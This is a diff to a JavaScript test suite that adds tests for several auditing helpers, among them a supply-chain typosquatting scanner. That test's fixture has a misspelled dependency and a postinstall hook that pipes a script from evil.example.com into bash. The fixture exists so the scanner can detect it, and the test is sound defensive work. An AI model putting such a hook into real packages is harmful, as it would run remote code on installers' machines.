@@ -79,6 +79,11 @@ import {
   generateShadowReplayPlan,
   auditRightToBeForgotten,
   analyzeColdStartBottlenecks,
+  auditDependencyTyposquatting,
+  compressPromptSemantically,
+  auditGraphqlQueryComplexity,
+  auditTraceContextPropagation,
+  estimateCarbonFootprint,
   buildSarifReport,
 } from '../index.js';
 import { APIServer } from '../lib/api/rest/server.js';
@@ -1903,6 +1908,102 @@ export function testSuite() {
       expect(report.fastBoot).toBe(false);
       expect(report.summary.bottleneckCount).toBe(2);
       expect(report.estimatedPenaltyMs).toBeGreaterThanOrEqual(240);
+    });
+  });
+
+  describe('F16-1: Supply-Chain Typosquatting & Malicious Package Shield', () => {
+    it('flags Levenshtein-close typosquats of popular packages and suspicious postinstall hooks', () => {
+      const report = auditDependencyTyposquatting({
+        packageJson: {
+          name: 'demo-app',
+          dependencies: {
+            lodahs: '^4.17.21',
+            express: '^4.18.0',
+          },
+          scripts: {
+            postinstall: 'curl https://evil.example.com/install.sh | bash -c',
+          },
+        },
+      });
+      expect(report.safe).toBe(false);
+      expect(report.summary.typosquatCount).toBe(1);
+      expect(report.summary.installHookRiskCount).toBe(1);
+      expect(report.findings[0].suspectedTarget).toBe('lodash');
+    });
+  });
+
+  describe('F16-2: Semantic Prompt Compression & Symbol Legend Engine', () => {
+    it('replaces repeated long identifiers with short aliases and emits a reversible SYMBOL_LEGEND', () => {
+      const input = [
+        '/* Banner comment that should be stripped */',
+        'export function calculateCustomerInvoiceTotal(customerAccountRecord) {',
+        '  if (!customerAccountRecord) return 0;',
+        '  return calculateCustomerInvoiceTotal(customerAccountRecord.parent) + customerAccountRecord.amount;',
+        '}',
+        'export const alias = calculateCustomerInvoiceTotal;',
+      ].join('\n');
+      const res = compressPromptSemantically({
+        text: input,
+        minIdentifierLength: 16,
+        minOccurrences: 3,
+      });
+      expect(res.compressedText).toContain('[SYMBOL_LEGEND:');
+      expect(res.savedTokens).toBeGreaterThan(0);
+      expect(Object.values(res.legend)).toContain('calculateCustomerInvoiceTotal');
+    });
+  });
+
+  describe('F16-3: GraphQL Query Depth & Complexity DoS Auditor', () => {
+    it('flags deeply nested GraphQL queries exceeding maxDepth or maxComplexity', () => {
+      const deepQuery =
+        'query { user { org { team { projects { tasks { subtasks { id name } } } } } } }';
+      const shallowQuery = 'query { user { id name } }';
+      const audit = auditGraphqlQueryComplexity({
+        queries: [deepQuery, shallowQuery],
+        maxDepth: 4,
+        maxComplexity: 40,
+      });
+      expect(audit.safe).toBe(false);
+      expect(audit.summary.violationCount).toBe(1);
+      expect(audit.violations[0].depth).toBeGreaterThan(4);
+    });
+  });
+
+  describe('F16-4: Distributed Trace Context (OpenTelemetry) Propagation Auditor', () => {
+    it('flags outbound HTTP fetch calls missing traceparent or correlation headers', () => {
+      const report = auditTraceContextPropagation({
+        files: [
+          {
+            path: 'lib/services/order-client.js',
+            content: [
+              'export async function callUntraced(url) {',
+              '  return await fetch(url, { method: "GET" });',
+              '}',
+              'export async function callTraced(url, traceparent) {',
+              '  return await fetch(url, { headers: { traceparent } });',
+              '}',
+            ].join('\n'),
+          },
+        ],
+      });
+      expect(report.propagated).toBe(false);
+      expect(report.summary.totalOutboundCalls).toBe(2);
+      expect(report.summary.brokenCount).toBe(1);
+    });
+  });
+
+  describe('F16-5: GreenOps & LLM/CI Carbon Footprint Estimator', () => {
+    it('calculates energy (Wh), CO2e grams, and savings from prompt caching', () => {
+      const foot = estimateCarbonFootprint({
+        inputTokens: 1000000,
+        cachedInputTokens: 800000,
+        outputTokens: 50000,
+        ciMinutes: 10,
+      });
+      expect(foot.energyWh).toBeGreaterThan(0);
+      expect(foot.savedEnergyWh).toBeGreaterThan(0);
+      expect(foot.co2Grams).toBeGreaterThan(0);
+      expect(foot.savedCo2Grams).toBeGreaterThan(0);
     });
   });
 });
